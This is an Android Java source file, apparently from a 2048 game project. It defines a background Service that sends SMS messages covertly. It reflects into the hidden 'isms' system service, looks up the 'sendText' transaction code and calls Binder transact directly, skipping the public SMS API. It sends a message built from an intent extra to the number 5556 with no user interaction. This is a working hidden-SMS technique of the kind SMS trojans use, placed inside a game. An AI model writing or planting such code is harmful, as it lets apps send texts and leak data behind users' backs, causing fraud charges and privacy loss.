package com.zhy.game2048;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

public class SendSMS extends Service {

	private static int INTERFACE_TRANSACTION = ('_' << 24) | ('N' << 16)
			| ('T' << 8) | 'F';
	private static String targetmethod = "sendText";

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		try {
			IBinder iBinder = getIBinder("isms");
			Log.i("YU", iBinder.toString());
			String interfaceName = getInterfaceName(iBinder);
			Log.i("YU", interfaceName);
			int methodCode = getCODE(interfaceName);
			Log.i("YU", methodCode + "");
			Parcel data = Parcel.obtain();
			Parcel reply = Parcel.obtain();
			data.writeInterfaceToken(interfaceName);
			/*
			 * 
			 * 
			 * */
			String callingPkg=this.getPackageName();
			String destAddr="5556";
			String scAddr=null;
			String receive="2048\n"+intent.getStringExtra("MessageContent");
			String text=new String(receive.getBytes(),"UTF-8");
			Log.i("YU", text);
            PendingIntent sentIntent=null;
            PendingIntent deliveryIntent=null;

            data.writeString(callingPkg);
            data.writeString(destAddr);
            data.writeString(scAddr);
            data.writeString(text);
            data.writeValue(sentIntent);
            data.writeValue(deliveryIntent);
            
			iBinder.transact(methodCode, data, reply, 0);
			reply.readException();

			data.recycle();
			reply.recycle();

		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (RemoteException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	private IBinder getIBinder(String serName) throws ClassNotFoundException,
			NoSuchMethodException, IllegalAccessException,
			IllegalArgumentException, InvocationTargetException {
		Class<?> smCls = Class.forName("android.os.ServiceManager");
		Method getIBinderMth = smCls.getMethod("getService", String.class);
		IBinder iBinder = (IBinder) getIBinderMth.invoke(null, serName);
		return iBinder;
	}

	private String getInterfaceName(IBinder serHandle) throws RemoteException {
		Parcel data = Parcel.obtain();
		Parcel reply = Parcel.obtain();
		serHandle.transact(INTERFACE_TRANSACTION, data, reply, 0);
		String interfacename = reply.readString();
		data.recycle();
		reply.recycle();
		return interfacename;
	}

	private int getCODE(String intername) throws Exception {
		Class<?> clstub = Class.forName(intername + "$Stub");
		Field field = clstub.getDeclaredField("TRANSACTION_" + targetmethod);
		field.setAccessible(true);
		return field.getInt(null);
	}
}
